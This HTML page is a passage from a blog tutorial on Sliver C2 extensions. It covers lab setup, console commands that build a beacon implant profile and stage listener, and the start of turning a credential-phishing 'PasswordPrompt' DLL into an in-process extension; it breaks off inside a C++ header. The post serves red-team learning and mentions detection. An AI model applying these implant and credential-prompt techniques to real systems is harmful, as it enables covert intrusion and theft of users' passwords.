@@ -1,0 +1,1221 @@
+<!DOCTYPE html>
+<html lang="en-US">
+  <head>
+    <meta name="generator" content="Hugo 0.92.2" />
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Learning Sliver C2 (12) - Extensions | text/plain</title>
+    <meta name="description" content="Deep-dive into Sliver extensions, a means to execute DLLs reflectively within the implant process.
+We will see how to develop, install and run them.
+Extensions can run one-off jobs which operators submit and get output from when the job is done.
+They can also be used to start long-running background jobs the output of which is retrieved some time later.
+That however works only with session mode implants, as far as I can tell.
+As usual I finish with opportunities for detection and spoiler alert: it&#39;s difficult.
+">
+    <meta name="keywords" content="c2, sliver, tutorial, implant, extensions, DLL, PE">
+    
+    
+    
+    
+    
+
+  <meta name="author" content="Dominic Breuker">
+
+
+    <meta property="og:title" content="Learning Sliver C2 (12) - Extensions" />
+<meta property="og:description" content="Deep-dive into Sliver extensions, a means to execute DLLs reflectively within the implant process.
+We will see how to develop, install and run them.
+Extensions can run one-off jobs which operators submit and get output from when the job is done.
+They can also be used to start long-running background jobs the output of which is retrieved some time later.
+That however works only with session mode implants, as far as I can tell.
+As usual I finish with opportunities for detection and spoiler alert: it&#39;s difficult.
+" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://dominicbreuker.com/post/learning_sliver_c2_12_extensions/" /><meta property="og:image" content="https://dominicbreuker.com/img/avatar.png"/><meta property="article:section" content="post" />
+<meta property="article:published_time" content="2023-03-23T00:00:00+00:00" />
+<meta property="article:modified_time" content="2023-03-23T00:00:00+00:00" />
+
+
+    <meta name="twitter:card" content="summary_large_image"/>
+<meta name="twitter:image" content="https://dominicbreuker.com/img/avatar.png"/>
+
+<meta name="twitter:title" content="Learning Sliver C2 (12) - Extensions"/>
+<meta name="twitter:description" content="Deep-dive into Sliver extensions, a means to execute DLLs reflectively within the implant process.
+We will see how to develop, install and run them.
+Extensions can run one-off jobs which operators submit and get output from when the job is done.
+They can also be used to start long-running background jobs the output of which is retrieved some time later.
+That however works only with session mode implants, as far as I can tell.
+As usual I finish with opportunities for detection and spoiler alert: it&#39;s difficult.
+"/>
+
+    
+
+
+
+  <meta property="og:image" content="img/avatar.png">
+
+
+    <meta name="theme-color" content="#000">
+
+    
+    
+    
+    
+    <link rel="canonical" href="https://dominicbreuker.com/post/learning_sliver_c2_12_extensions/">
+    
+    
+    <link rel="icon" sizes="any" href="/img/favicon.ico">
+
+    <style>
+  html{font-size:12px}*{box-sizing:border-box;text-rendering:geometricPrecision}body{font-size:1rem;line-height:1.5rem;margin:0;font-family:Menlo,Monaco,Lucida Console,Liberation Mono,DejaVu Sans Mono,Bitstream Vera Sans Mono,Courier New,monospace,serif;word-wrap:break-word}h1,h2,h3,h4,h5,h6{line-height:1.3em}fieldset{border:none;padding:0;margin:0}pre{padding:2rem;margin:1.75rem 0;background-color:#fff;border:1px solid #ccc;overflow:auto}code[class*=language-],pre[class*=language-],pre code{font-weight:100;text-shadow:none;margin:1.75rem 0}a{cursor:pointer;color:#ff2e88;text-decoration:none;border-bottom:1px solid #ff2e88}a:hover{background-color:#ff2e88;color:#fff}.grid{display:-ms-flexbox;display:flex;-ms-flex-wrap:wrap;flex-wrap:wrap}.grid.\-top{-ms-flex-align:start;-ms-grid-row-align:flex-start;align-items:flex-start}.grid.\-middle{-ms-flex-align:center;-ms-grid-row-align:center;align-items:center}.grid.\-bottom{-ms-flex-align:end;-ms-grid-row-align:flex-end;align-items:flex-end}.grid.\-stretch{-ms-flex-align:stretch;-ms-grid-row-align:stretch;align-items:stretch}.grid.\-baseline{-ms-flex-align:baseline;-ms-grid-row-align:baseline;align-items:baseline}.grid.\-left{-ms-flex-pack:start;justify-content:flex-start}.grid.\-center{-ms-flex-pack:center;justify-content:center}.grid.\-right{-ms-flex-pack:end;justify-content:flex-end}.grid.\-between{-ms-flex-pack:justify;justify-content:space-between}.grid.\-around{-ms-flex-pack:distribute;justify-content:space-around}.cell{-ms-flex:1;flex:1;box-sizing:border-box}@media screen and (min-width:768px){.cell.\-1of12{-ms-flex:0 0 8.33333%;flex:0 0 8.33333%}.cell.\-2of12{-ms-flex:0 0 16.66667%;flex:0 0 16.66667%}.cell.\-3of12{-ms-flex:0 0 25%;flex:0 0 25%}.cell.\-4of12{-ms-flex:0 0 33.33333%;flex:0 0 33.33333%}.cell.\-5of12{-ms-flex:0 0 41.66667%;flex:0 0 41.66667%}.cell.\-6of12{-ms-flex:0 0 50%;flex:0 0 50%}.cell.\-7of12{-ms-flex:0 0 58.33333%;flex:0 0 58.33333%}.cell.\-8of12{-ms-flex:0 0 66.66667%;flex:0 0 66.66667%}.cell.\-9of12{-ms-flex:0 0 75%;flex:0 0 75%}.cell.\-10of12{-ms-flex:0 0 83.33333%;flex:0 0 83.33333%}.cell.\-11of12{-ms-flex:0 0 91.66667%;flex:0 0 91.66667%}}@media screen and (max-width:768px){.grid{-ms-flex-direction:column;flex-direction:column}.cell{-ms-flex:0 0 auto;flex:0 0 auto}}.hack,.hack blockquote,.hack code,.hack em,.hack h1,.hack h2,.hack h3,.hack h4,.hack h5,.hack h6,.hack strong{font-size:1rem;font-style:normal;font-family:Menlo,Monaco,Lucida Console,Liberation Mono,DejaVu Sans Mono,Bitstream Vera Sans Mono,Courier New,monospace,serif}.hack blockquote,.hack code,.hack em,.hack strong{line-height:20px}.hack blockquote,.hack code,.hack footer,.hack h1,.hack h2,.hack h3,.hack h4,.hack h5,.hack h6,.hack header,.hack li,.hack ol,.hack p,.hack section,.hack ul{float:none;margin:0;padding:0}.hack blockquote,.hack h1,.hack ol,.hack p,.hack ul{margin-top:20px;margin-bottom:20px}.hack h1{position:relative;display:inline-block;display:table-cell;padding:20px 0 30px;margin:0;overflow:hidden}.hack h1:after{content:"====================================================================================================";position:absolute;bottom:10px;left:0}.hack h1+*{margin-top:0}.hack h2,.hack h3,.hack h4,.hack h5,.hack h6{position:relative;margin-bottom:1.75rem}.hack h2:before,.hack h3:before,.hack h4:before,.hack h5:before,.hack h6:before{display:inline}.hack h2:before{content:"## "}.hack h3:before{content:"### "}.hack h4:before{content:"#### "}.hack h5:before{content:"##### "}.hack h6:before{content:"###### "}.hack li{position:relative;display:block;padding-left:20px}.hack li:after{position:absolute;top:0;left:0}.hack ul>li:after{content:"-"}.hack ol{counter-reset:a}.hack ol>li:after{content:counter(a) ".";counter-increment:a}.hack blockquote{position:relative;padding-left:17px;padding-left:2ch;overflow:hidden}.hack blockquote:after{content:">\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>";white-space:pre;position:absolute;top:0;left:0;line-height:20px}.hack em:after,.hack em:before{content:"*";display:inline}.hack pre code:after,.hack pre code:before{content:''}.hack code{font-weight:700}.hack code:after,.hack code:before{content:"`";display:inline}.hack hr{position:relative;height:20px;overflow:hidden;border:0;margin:20px 0}.hack hr:after{content:"----------------------------------------------------------------------------------------------------";position:absolute;top:0;left:0;line-height:20px;width:100%;word-wrap:break-word}@-moz-document url-prefix(){.hack h1{display:block}}.hack-ones ol>li:after{content:"1."}p{margin:0 0 1.75rem}.container{max-width:70rem}.container,.container-fluid{margin:0 auto;padding:0 1rem}.inner{padding:1rem}.inner2x{padding:2rem}.pull-left{float:left}.pull-right{float:right}.progress-bar{height:8px;opacity:.8;background-color:#ccc;margin-top:12px}.progress-bar.progress-bar-show-percent{margin-top:38px}.progress-bar-filled{background-color:gray;height:100%;transition:width .3s ease;position:relative;width:0}.progress-bar-filled:before{content:'';border:6px solid transparent;border-top-color:gray;position:absolute;top:-12px;right:-6px}.progress-bar-filled:after{color:gray;content:attr(data-filled);display:block;font-size:12px;white-space:nowrap;position:absolute;border:6px solid transparent;top:-38px;right:0;-ms-transform:translateX(50%);transform:translateX(50%)}table{width:100%;border-collapse:collapse;margin:1.75rem 0;color:#778087}table td,table th{vertical-align:top;border:1px solid #ccc;line-height:15px;padding:10px}table thead th{font-size:10px}table tbody td:first-child{font-weight:700;color:#333}.form{width:30rem}.form-group{margin-bottom:1.75rem;overflow:auto}.form-group label{border-bottom:2px solid #ccc;color:#333;width:10rem;display:inline-block;height:38px;line-height:38px;padding:0;float:left;position:relative}.form-group.form-success label{color:#4caf50!important;border-color:#4caf50!important}.form-group.form-warning label{color:#ff9800!important;border-color:#ff9800!important}.form-group.form-error label{color:#f44336!important;border-color:#f44336!important}.form-control{outline:none;border:none;border-bottom:2px solid #ccc;padding:.5rem 0;width:20rem;height:38px;background-color:transparent}.form-control:focus{border-color:#555}.form-group.form-textarea label:after{position:absolute;content:'';width:2px;background-color:#fff;right:-2px;top:0;bottom:0}textarea.form-control{height:auto;resize:none;padding:1rem 0;border-bottom:2px solid #ccc;border-left:2px solid #ccc;padding:.5rem}select.form-control{border-radius:0;background-color:transparent;-webkit-appearance:none;-moz-appearance:none;-ms-appearance:none}.help-block{color:#999;margin-top:.5rem}.form-actions{margin-bottom:1.75rem}.btn{display:-ms-inline-flexbox;display:inline-flex;-ms-flex-align:center;align-items:center;-ms-flex-pack:center;justify-content:center;cursor:pointer;outline:none;padding:.65rem 2rem;font-size:1rem;-webkit-user-select:none;-moz-user-select:none;-ms-user-select:none;user-select:none;position:relative;z-index:1}.btn:active{box-shadow:inset 0 1px 3px rgba(0,0,0,.12)}.btn.btn-ghost{border-color:#757575;color:#757575;background-color:transparent}.btn.btn-ghost:focus,.btn.btn-ghost:hover{border-color:#424242;color:#424242;z-index:2}.btn.btn-ghost:hover{background-color:transparent}.btn-block{width:100%;display:-ms-flexbox;display:flex}.btn-default{color:#fff;background-color:#e0e0e0;border:1px solid #e0e0e0;color:#333}.btn-default:focus:not(.btn-ghost),.btn-default:hover{background-color:#dcdcdc;border-color:#dcdcdc}.btn-success{color:#fff;background-color:#4caf50;border:1px solid #4caf50}.btn-success:focus:not(.btn-ghost),.btn-success:hover{background-color:#43a047;border-color:#43a047}.btn-success.btn-ghost{border-color:#4caf50;color:#4caf50}.btn-success.btn-ghost:focus,.btn-success.btn-ghost:hover{border-color:#388e3c;color:#388e3c;z-index:2}.btn-error{color:#fff;background-color:#f44336;border:1px solid #f44336}.btn-error:focus:not(.btn-ghost),.btn-error:hover{background-color:#e53935;border-color:#e53935}.btn-error.btn-ghost{border-color:#f44336;color:#f44336}.btn-error.btn-ghost:focus,.btn-error.btn-ghost:hover{border-color:#d32f2f;color:#d32f2f;z-index:2}.btn-warning{color:#fff;background-color:#ff9800;border:1px solid #ff9800}.btn-warning:focus:not(.btn-ghost),.btn-warning:hover{background-color:#fb8c00;border-color:#fb8c00}.btn-warning.btn-ghost{border-color:#ff9800;color:#ff9800}.btn-warning.btn-ghost:focus,.btn-warning.btn-ghost:hover{border-color:#f57c00;color:#f57c00;z-index:2}.btn-info{color:#fff;background-color:#00bcd4;border:1px solid #00bcd4}.btn-info:focus:not(.btn-ghost),.btn-info:hover{background-color:#00acc1;border-color:#00acc1}.btn-info.btn-ghost{border-color:#00bcd4;color:#00bcd4}.btn-info.btn-ghost:focus,.btn-info.btn-ghost:hover{border-color:#0097a7;color:#0097a7;z-index:2}.btn-primary{color:#fff;background-color:#2196f3;border:1px solid #2196f3}.btn-primary:focus:not(.btn-ghost),.btn-primary:hover{background-color:#1e88e5;border-color:#1e88e5}.btn-primary.btn-ghost{border-color:#2196f3;color:#2196f3}.btn-primary.btn-ghost:focus,.btn-primary.btn-ghost:hover{border-color:#1976d2;color:#1976d2;z-index:2}.btn-group{overflow:auto}.btn-group .btn{float:left}.btn-group .btn-ghost:not(:first-child){margin-left:-1px}.card{border:1px solid #ccc}.card .card-header{color:#333;text-align:center;background-color:#ddd;padding:.5rem 0}.alert{color:#ccc;padding:1rem;border:1px solid #ccc;margin-bottom:1.75rem}.alert-success{color:#4caf50;border-color:#4caf50}.alert-error{color:#f44336;border-color:#f44336}.alert-info{color:#00bcd4;border-color:#00bcd4}.alert-warning{color:#ff9800;border-color:#ff9800}.media:not(:last-child){margin-bottom:1.25rem}.media-left{padding-right:1rem}.media-left,.media-right{display:table-cell;vertical-align:top}.media-right{padding-left:1rem}.media-body{display:table-cell;vertical-align:top}.media-heading{font-size:1.16667rem;font-weight:700}.media-content{margin-top:.3rem}.avatarholder,.placeholder{background-color:#f0f0f0;text-align:center;color:#b9b9b9;font-size:1rem;border:1px solid #f0f0f0}.avatarholder{width:48px;height:48px;line-height:46px;font-size:2rem;background-size:cover;background-position:50%;background-repeat:no-repeat}.avatarholder.rounded{border-radius:33px}.loading{display:inline-block;content:'&nbsp;';height:20px;width:20px;margin:0 .5rem;animation:a .6s infinite linear;border:2px solid #e91e63;border-right-color:transparent;border-radius:50%}.btn .loading{margin-bottom:0;width:14px;height:14px}.btn div.loading{float:left}.alert .loading{margin-bottom:-5px}@keyframes a{0%{transform:rotate(0deg)}to{transform:rotate(1turn)}}.menu{width:100%}.menu .menu-item{display:block;color:#616161;border-color:#616161}.menu .menu-item.active,.menu .menu-item:hover{color:#000;border-color:#000;background-color:transparent}@media screen and (max-width:768px){.form-group label{display:block;border-bottom:none;width:100%}.form-group.form-textarea label:after{display:none}.form-control{width:100%}textarea.form-control{border-left:none;padding:.5rem 0}pre::-webkit-scrollbar{height:3px}}@media screen and (max-width:480px){.form{width:100%}}.dark{color:#ccc}.dark,.dark pre{background-color:#000}.dark pre{padding:0;border:none}.dark pre code{color:#00bcd4}.dark h1 a,.dark h2 a,.dark h3 a,.dark h4 a,.dark h5 a{color:#ccc}.dark code,.dark strong{color:#fff}.dark code{font-weight:100}.dark table{color:#ccc}.dark table td,.dark table th{border-color:#444}.dark table tbody td:first-child{color:#fff}.dark .form-group label{color:#ccc;border-color:rgba(95,95,95,.78)}.dark .form-group.form-textarea label:after{background-color:#000}.dark .form-control{color:#ccc;border-color:rgba(95,95,95,.78)}.dark .form-control:focus{border-color:#ccc;color:#ccc}.dark textarea.form-control{color:#ccc}.dark .card{border-color:rgba(95,95,95,.78)}.dark .card .card-header{background-color:transparent;color:#ccc;border-bottom:1px solid rgba(95,95,95,.78)}.dark .btn.btn-ghost.btn-default{border-color:#ababab;color:#ababab}.dark .btn.btn-ghost.btn-default:focus,.dark .btn.btn-ghost.btn-default:hover{border-color:#9c9c9c;color:#9c9c9c;z-index:1}.dark .btn.btn-ghost.btn-default:focus,.dark .btn.btn-ghost.btn-default:hover{border-color:#e0e0e0;color:#e0e0e0}.dark .btn.btn-ghost.btn-primary:focus,.dark .btn.btn-ghost.btn-primary:hover{border-color:#64b5f6;color:#64b5f6}.dark .btn.btn-ghost.btn-success:focus,.dark .btn.btn-ghost.btn-success:hover{border-color:#81c784;color:#81c784}.dark .btn.btn-ghost.btn-info:focus,.dark .btn.btn-ghost.btn-info:hover{border-color:#4dd0e1;color:#4dd0e1}.dark .btn.btn-ghost.btn-error:focus,.dark .btn.btn-ghost.btn-error:hover{border-color:#e57373;color:#e57373}.dark .btn.btn-ghost.btn-warning:focus,.dark .btn.btn-ghost.btn-warning:hover{border-color:#ffb74d;color:#ffb74d}.dark .avatarholder,.dark .placeholder{background-color:transparent;border-color:#333}.dark .menu .menu-item{color:#ccc;border-color:rgba(95,95,95,.78)}.dark .menu .menu-item.active,.dark .menu .menu-item:hover{color:#fff;border-color:#ccc}
+  :root {
+  --screen-size-small: 30em; /* breakpoint reference only */
+}
+@keyframes intro {
+  0% {
+    opacity: 0;
+  }
+  100% {
+    opacity: 1;
+  }
+}
+.muted {
+  color: rgba(255, 255, 255, 0.5);
+}
+.readmore {
+  margin-bottom: 2.2em;
+}
+.responsive-iframe {
+  position: relative;
+  padding-bottom: 56.25%; /* 16:9 */
+  padding-top: 25px;
+  height: 0;
+}
+.responsive-iframe iframe {
+  position: absolute;
+  top: 0;
+  left: 0;
+  width: 100%;
+  height: 100%;
+}
+iframe {
+  border: 0;
+}
+main, footer {
+  animation: intro 0.3s both;
+  animation-delay: 0.15s;
+}
+footer time[datetime$="M"]:before {
+  content: "\2013\0020";
+}
+@media only screen
+  and ( max-width: 30em ) {
+  footer time[datetime$="M"] {
+    display: none;
+  }
+}
+blockquote cite {
+  display: block;
+}
+blockquote cite::before {
+   content: "\2014";
+}
+:target {
+  color: #fff;
+}
+/* hack.css overrides and enhancements */
+.hack li ul {
+  margin: 0;
+}
+.main {
+  padding: 20px 10px;
+}
+nav a.active {
+  background-color: #ff2e88;
+  color: #fff;
+}
+a[itemprop="url"] {
+  color: #ff9800;
+}
+a[itemprop="url"]:hover {
+  color: #fff;
+}
+a[href*="://"]::after,
+a[rel*="external"] {
+  content: " " url("data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20class='i-external'%20viewBox='0%200%2032%2032'%20width='14'%20height='14'%20fill='none'%20stroke='%23ff9800'%20stroke-linecap='round'%20stroke-linejoin='round'%20stroke-width='9.38%'%3E%3Cpath%20d='M14%209%20L3%209%203%2029%2023%2029%2023%2018%20M18%204%20L28%204%2028%2014%20M28%204%20L14%2018'/%3E%3C/svg%3E");
+}
+figure a[href*="://"]::after,
+figure a[rel*="external"] {
+  content: "";
+}
+html {
+  font-size: 13px;
+}
+.hack pre {
+  font-size: 17px;
+}
+article [itemprop="description"] {
+  margin-bottom: 20px;
+  margin-top: 20px;
+}
+@media screen and (min-width: 768px) {
+  html {
+    font-size: 1em;
+  }
+  .container {
+    max-width: 50rem;
+  }
+}
+
+  nav a.active {
+  background-color: #33cc33; /*ff2e88*/
+  color: #fff;
+}
+a[itemprop="url"] {
+  color: #339933; /*ff9800*/
+}
+a[itemprop="url"]:hover {
+  color: #fff;
+  background-color: #33cc33; /*ff2e88*/
+}
+
+.dark pre code {
+  color: #248f24;
+}
+
+.dark code {
+  color: #248f24;
+}
+
+a {
+  color: #339933; /*ff9800*/
+  border-bottom: 1px solid #33cc33;
+}
+
+a:hover {
+  color: #fff;
+  background-color: #33cc33; /*ff2e88*/
+}
+
+/* custom styles */
+figure {
+  margin-left: auto;
+  margin-right: auto;
+  text-align: center;
+}
+figure img {
+  max-width: 100%;
+}
+figure a {
+  border-bottom: none !important;
+}
+figure a:hover {
+  background-color: inherit !important;
+}
+
+input:invalid {
+  border-bottom: 2px solid #f44336 !important;
+}
+
+input:valid {
+  border-bottom: 2px solid #ccc;
+}
+
+</style>
+
+    
+    
+      <script async src="/js/lazysizes.min.js"></script>
+    
+    
+      <script async src="/js/bpgdec8a.js"></script>
+      <script async src="/js/bpgdec8.js"></script>
+      <script async src="/js/bpgdec.js"></script>
+    
+  </head>
+  
+  <body class="hack dark main container">
+    <header>
+  
+  <nav itemscope itemtype="http://schema.org/SiteNavigationElement">
+    
+    
+      <a itemprop="url" class="" href="/"><span itemprop="name">Home</span></a>
+    
+      <a itemprop="url" class="" href="/post/"><span itemprop="name">Post</span></a>
+    
+      <a itemprop="url" class="" href="/encoders/"><span itemprop="name">Encoders</span></a>
+    
+      <a itemprop="url" class="" href="/about/"><span itemprop="name">About</span></a>
+    
+  </nav>
+
+
+</header>
+    <main>
+  <article itemscope itemtype="http://schema.org/BlogPosting">
+    <meta itemprop="name" content="Learning Sliver C2 (12) - Extensions">
+<meta itemprop="description" content="Deep-dive into Sliver extensions, a means to execute DLLs reflectively within the implant process.
+We will see how to develop, install and run them.
+Extensions can run one-off jobs which operators submit and get output from when the job is done.
+They can also be used to start long-running background jobs the output of which is retrieved some time later.
+That however works only with session mode implants, as far as I can tell.
+As usual I finish with opportunities for detection and spoiler alert: it&#39;s difficult.
+"><meta itemprop="datePublished" content="2023-03-23T00:00:00+00:00" />
+<meta itemprop="dateModified" content="2023-03-23T00:00:00+00:00" />
+<meta itemprop="wordCount" content="4978"><meta itemprop="image" content="https://dominicbreuker.com/img/avatar.png"/>
+<meta itemprop="keywords" content="c2,sliver,tutorial,implant,extensions,DLL,PE," />
+    <script async src="/js/baffle.js"></script>
+    <header>
+      <h1 class="baffle" itemprop="headline">Learning Sliver C2 (12) - Extensions</h1>
+      <p class="muted">
+        <svg style="margin-bottom:-3px" class="i-clock" viewBox="0 0 32 32" width="16" height="16" fill="none" stroke="currentcolor" stroke-linecap="round" stroke-linejoin="round" stroke-width="6.25%">
+  <circle cx="16" cy="16" r="14" />
+  <path d="M16 8 L16 16 20 20" />
+</svg>
+<span>24 minute read</span>
+<svg style="margin-bottom: -3px" class="i-edit" viewBox="0 0 32 32" width="16" height="16" fill="none" stroke="currentcolor" stroke-linecap="round" stroke-linejoin="round" stroke-width="6.25%">
+  <path d="M30 7 L25 2 5 22 3 29 10 27 Z M21 6 L26 11 Z M5 22 L10 27 Z" />
+</svg>
+
+  Published: <time datetime="2023-03-23T00:00:00&#43;00:00">23 Mar, 2023</time>
+
+
+      </p>
+    </header>
+    
+      <blockquote itemprop="description">Deep-dive into Sliver extensions, a means to execute DLLs reflectively within the implant process.
+We will see how to develop, install and run them.
+Extensions can run one-off jobs which operators submit and get output from when the job is done.
+They can also be used to start long-running background jobs the output of which is retrieved some time later.
+That however works only with session mode implants, as far as I can tell.
+As usual I finish with opportunities for detection and spoiler alert: it&#39;s difficult.
+</blockquote>
+    
+    
+  <details>
+    <summary>Table of Contents</summary>
+    <nav id="TableOfContents">
+  <ul>
+    <li><a href="#introduction">Introduction</a></li>
+    <li><a href="#preparations">Preparations</a></li>
+    <li><a href="#making-an-extension">Making an extension</a>
+      <ul>
+        <li><a href="#build">Build</a></li>
+        <li><a href="#install-and-run">Install and run</a></li>
+      </ul>
+    </li>
+    <li><a href="#sliverkeylogger-extension">SliverKeylogger extension</a></li>
+    <li><a href="#implementation-details-and-source-code">Implementation details and source code</a>
+      <ul>
+        <li><a href="#sliver-client">Sliver Client</a></li>
+        <li><a href="#sliver-server">Sliver server</a></li>
+        <li><a href="#sliver-implant">Sliver implant</a></li>
+      </ul>
+    </li>
+    <li><a href="#detection">Detection</a></li>
+  </ul>
+</nav>
+  </details>
+  <script>
+    const el = document.querySelector('details summary')
+    el.onclick = () => {
+      (function(l,o,a,d,e,r){e=o.createElement(a),r=o.getElementsByTagName(a)[0];e.async=1;e.src=d;r.parentNode.insertBefore(e,r)})(window,document,'script','/js/smoothscroll.js');
+      el.onclick = null
+    }
+    document.querySelectorAll('#TableOfContents a').forEach(link => {
+      link.addEventListener('click', () => {
+        document.querySelector(
+          link.href.slice(link.href.indexOf('#'))
+        ).scrollIntoView({ behavior: 'smooth' })
+      })
+    })
+  </script>
+
+
+    <div itemprop="articleBody">
+      <h1 id="sliver-c2">Sliver C2</h1>
+<p>This post is part of a tutorial blog post series on Sliver C2 (used here in version v1.5.35 with a few bugfixes
+on top, commit <a href="https://github.com/BishopFox/sliver/commit/749f71d226e5bd239d6513feeb99faf6804a8d28">749f71d</a>.
+For a series overview: <a href="../../post/learning_sliver_c2_01_installation/#series-overview">click here</a>.</p>
+<h2 id="introduction">Introduction</h2>
+<p>In posts <a href="../../post/learning_sliver_c2_09_execute_assembly/">9</a>
+to <a href="../../post/learning_sliver_c2_11_spawndll/">11</a>
+we discussed what I originally advertised as the three ways to run 3rd party tools.
+Time to reflect on what we can do with that.
+Its possible to run .NET code with <code>execute-assembly</code> and we can do that either by
+spawning and injecting into a sacrificial process (suspicious and detectable)
+or we run them <code>--in-process</code> (harder to detect, but seemed to be less stable and killed a few of my beacons).
+Its also possible to run native code, which can be a DLL or EXE.
+We do that with <code>sideload</code> or, if we have a reflective DLL, we use <code>spawndll</code>.
+Native code always runs in a sacrificial process (suspicious and detectable).
+Is there no way to run them in-process?</p>
+<p>Well, turns out there is because there are more than three ways to run 3rd party tools.
+Enter the world of Sliver extensions.
+They give us a way to run custom DLLs within the implant process,
+as if they were native capabilities built into the implant.
+This is a bit like an <code>--in-process</code> flag for <code>sideload</code> but also different.</p>
+<p>One difference is that you can only run DLLs that are specifically designed
+to be Sliver extensions. An implant expects that the DLL implements
+the extension API. It is simple and consists of only two functions.
+One is your entrypoint which you have to export, the other is a callback
+used to communicate output back to the implant.
+A small interface indeed, but you have to modify your favorite DLLs a bit before you can use them.</p>
+<p>The other difference is the UX for the operator.
+Commands like <code>sideload</code> and <code>execute-assembly</code> expect a path to the program you want to run.
+Extensions are not run in a single command.
+Instead you must first install them, which creates a new command dedicated only to this extension.
+This new command runs the extension.</p>
+<p>A very interesting feature is that you can easily build extensions that support asynchronous interaction
+with long-running background processes. For example, you can have a keylogger extension
+which accepts three different arguments. One starts keylogging in the background and returns, another
+retrieves all keystrokes logged so far and a third one stops the background job.
+The extension can run and maintain global state in between the calls.
+A current limitation is that this works well only in session mode and not with a beacon.
+At the end of this post you will know why.</p>
+<p>We start learning about extensions by porting our test DLL from the previous posts to a Sliver extension.
+This illustrates how to implement the extension API and plug it into a DLL.
+We will also see the mechanics of working with extensions, i.e., how to install, load and run them.
+I&rsquo;ll follow up with a brief demonstration of the <a href="https://github.com/trustedsec/SliverKeylogger">SliverKeylogger</a>,
+an extension that shows the beauty of background processes and the limits of beacons.</p>
+<p>To deepen our understanding of extensions I&rsquo;ll subsequently discuss relevant parts of the source code.
+Since extensions are a complex feature we have to cover quite some ground.
+Therefore I keep it rather high-level and also leave out details about the reflective loader.
+Just as before in the <a href="../../post/learning_sliver_c2_11_spawndll/">post about spawndll</a> there would
+otherwise be substantial repetition with respect to the <a href="../../post/learning_sliver_c2_10_sideload/#inside-donut">post about sideload and Donut</a>.
+This time the reflective loader is implemented in Go and compiled into the implant.
+Apart from that, it seems to be mostly the same.</p>
+<p>Finally I&rsquo;ll examine if the Sliver extensions feature can be detected.
+As you may expect it will be difficult since all the indicators we usually see
+are related to process injection and extensions don&rsquo;t do that.</p>
+<p>All content of this post was produced in a lab environment.
+First there are some details about it, which may help you reproduce this stuff if you want to.</p>
+<h2 id="preparations">Preparations</h2>
+<p>My lab environment has the following hosts:</p>
+<ul>
+<li>a target running Windows which we want to infect (192.168.122.61)
+and which also serves as a Windows development machine (Visual Studio installed),</li>
+<li>a Sliver C2 server generating implant shellcode and running stage listeners (192.168.122.111 / sliver.labnet.local)</li>
+<li>a proxy server running Squid and a DNS service to resolve domain names in the lab (192.168.122.185)</li>
+</ul>
+<p>Posts
+<a href="../../post/learning_sliver_c2_01_installation/">1</a> to
+<a href="../../post/learning_sliver_c2_05_transports_in_detail_dns/">5</a>
+show how I created it. Details matter only if you want to replicate the setup.</p>
+<p>All you need for this post is a Windows target running a Sliver beacon implant which connects to your C2 server.
+I use my stager from <a href="../../post/learning_sliver_c2_06_stagers_process_injection">post 6</a>
+which downloads implant shellcode and runs it inside its own process.</p>
+<p>To prepare, connect to the Sliver console and set up a stage listener.
+Create an implant profile with
+<code>profiles new beacon --http sliver.labnet.local?driver=wininet --seconds 5 --jitter 0 --format shellcode --arch amd64 win64http</code>.
+Then start the listener:</p>
+<pre tabindex="0"><code>sliver &gt; stage-listener --url http://sliver.labnet.local:80 --profile win64http
+
+[*] No builds found for profile win64http, generating a new one
+[*] Job 1 (http) started
+
+sliver &gt;  jobs
+
+ ID   Name   Protocol   Port 
+==== ====== ========== ======
+ 1    http   tcp        80
+</code></pre><p>Now run your stager or get the implant running in any other way.</p>
+<h2 id="making-an-extension">Making an extension</h2>
+<h3 id="build">Build</h3>
+<p>The first step is to write the code of our new Sliver extension.
+As a basis, we use the source code from the previous posts.
+The <a href="../../post/learning_sliver_c2_10_sideload/#basic-usage-demonstration">PasswordPrompt DLL</a>
+can show a dialog box to victims who are asked to enter their Windows credentials.
+Whatever they enter is sent back to the operator.
+This tool was built as a regular DLL and we now want to make an extension out of it.
+Throughout this section, check out the source code linked above or compare this <a href="https://github.com/DominicBreuker/SliverSamples/tree/main/PasswordPromptExtension">GitHub repo</a>,
+which contains a complete Visual Studio solution of what we are about to build.</p>
+<p>In Visual Studio we first create a new C++ DLL project.
+Call it something like <code>PasswordPromptExtension</code>.
+Visual Studio creates a skeleton application with a file <code>dllmain.cpp</code> for you.
+Copy the function <code>askForCreds</code> from the source code
+in <a href="../../post/learning_sliver_c2_10_sideload/#basic-usage-demonstration">post 10</a>
+into this file and ensure you import all relevant dependencies.
+If you can build the solution without errors you know that it worked.
+The main source code of the extension is now there, but we cannot call it from an implant yet.</p>
+<p>Now it is time to implement the Sliver API.
+You must create two functions:</p>
+<ul>
+<li>a callback used to communicate output to the implant:
+<code>typedef int (*goCallback)(char*, int)</code></li>
+<li>an entrypoint to start the extension, to which you can give any name you like
+and which accepts a string of arguments, its length and the callback:
+<code>int NameYouLike(char* argsBuffer, uint32_t bufferSize, goCallback callback)</code></li>
+</ul>
+<p>Lets start implementing the callback part of this.
+I like to keep this in a separate file and treat the code
+as my own personal Sliver Extension SDK that can be pulled into
+existing projects to make extensions out of them.</p>
+<p>We must add two files to the solution for that.
+First create a header file &ldquo;output.h&rdquo; to define a few things.
+My file looks as seen below:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c++" data-lang="c++"><span style="color:#75715e">#pragma once
+</span><span style="color:#75715e"></span>
+<span style="color:#66d9ef">typedef</span> <span style="color:#a6e22e">int</span> (<span style="color:#f92672">*</span>goCallback)(<span style="color:#66d9ef">char</span><span style="color:#f92672">*</span>, <span style="color:#66d9ef">int</span>);
+
+<span style="color:#66d9ef">struct</span> <span style="color:#a6e22e">Output</span> {
